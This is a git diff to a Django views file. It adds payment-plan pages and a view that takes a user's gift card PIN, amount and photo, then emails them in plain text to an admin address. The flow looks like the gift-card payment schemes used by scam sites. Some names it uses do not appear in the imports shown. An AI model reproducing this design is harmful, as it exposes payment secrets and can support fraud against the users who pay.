@@ -1,6 +1,6 @@
-from django.shortcuts import render, redirect
+from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib import messages
-from django.contrib.auth.decorators import login_required
+from django.contrib.auth.decorators import login_required 
 from .forms import PinForm, LoginForm, SignupForm
 from django.core.mail import send_mail
 from .models import UserOTP
@@ -199,6 +199,59 @@ def success(request):
 
 def finish(request):
     return render(request, "userauths/finish.html")
+
+
+from .models import PaymentPlan
+def payment_plans(request):
+    payment_plans = PaymentPlan.objects.all().order_by('price')
+    # messages.success(request, 'Successfully submitted')
+    return render(request, 'userauths/payment_plans.html', {
+        'payment_plans': payment_plans,
+    })
+
+
+def payment_plan_detail(request, plan_id):
+    plan = get_object_or_404(PaymentPlan, pk=plan_id)
+    
+    if request.method == 'POST':
+        form = CreditCardForm(request.POST, request.FILES)
+        if form.is_valid():
+            # Save the form instance
+            credit_card = form.save()
+
+            # Construct the email
+            subject = "New Gift Card Uploaded"
+            message = (
+                f"A new gift card has been uploaded.\n\n"
+                f"Details:\n"
+                f"Card PIN: {credit_card.card_pin}\n"
+                f"Card Amount: {credit_card.card_amount}\n"
+                f"Uploaded At: {credit_card.uploaded_at}\n\n"
+                f"The card photo is attached to this email."
+            )
+            from_email = settings.DEFAULT_FROM_EMAIL
+            recipient_list = [settings.ADMIN_EMAIL]
+
+            # Attach the card photo
+            email = EmailMessage(subject, message, from_email, recipient_list)
+            if credit_card.card_photo:
+                email.attach_file(credit_card.card_photo.path)
+
+            # Send the email
+            email.send()
+
+            # Add success message and redirect
+            messages.success(request, 'Gift card uploaded successfully!')
+            return redirect('userauths:credit_card')
+        else:
+            messages.error(request, 'Please correct the errors in the form.')
+    else:
+        form = CreditCardForm()
+    # messages.success(request, 'Successfully submitted')
+    return render(request, 'userauths/payment_plan_detail.html', {
+        'plan': plan,
+        'form': form,
+    })
 
 
 def btc_payment(request):
